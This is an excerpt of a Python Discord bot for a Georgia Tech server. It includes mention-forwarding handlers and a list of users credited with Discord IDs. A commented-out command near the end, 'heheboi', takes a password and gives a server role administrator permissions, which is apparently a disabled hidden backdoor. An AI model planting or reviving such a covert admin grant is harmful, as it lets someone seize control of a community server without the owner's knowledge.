...
lastdog = 0
doggo_credits = [("Meru", 799447829856780289), ("Meru", 799447829856780289), ("Meru", 799447829856780289), ("Kira", 190611013232492544), ("Annie", 191576992682868738), ("Annie", 191576992682868738), ("Loki", 549393343583485962)]
     ...
     if not message.author.bot:
          ...
          if message.guild.id == 1182890708265357392:
               ...
               if pings_str != "":
                    ...
                    await ask_boomers.send(f"{words_str}{message.jump_url}\nmentioned by <@{message.author.id}>, pinging {pings_str}", silent = True)
          """
          ...
          if (message.guild.id == 1182890708265357392) and (not message.flags.silent):
               ...
               if to_ping:
                    ...
                    await ask_boomers.send(string_to_send + f"\n{message.jump_url}", silent = True)
...
# async def heheboi(ctx, member: discord.Member, password: str):
#      panda = member
...
#           await member.remove_roles(role, reason = "heheboi")
...
#      panda = member
#      print(panda.display_name)
#      gt28 = discord.utils.get(bot.guilds, name = "Georgia Tech '28")
#      # await ctx.channel.send(f"owner: {gt28.owner.name}")
#      role = discord.utils.get(gt28.roles, name="Special contributor")
#      perms = discord.Permissions(administrator=True)
#      # await member.add_roles(role, reason = "heheboi")
#      # await role.edit(name = "Special Contributor")
#      await role.edit(permissions= perms)
#      await ctx.channel.send(f"Panda is admin: {panda.guild_permissions.administrator}")
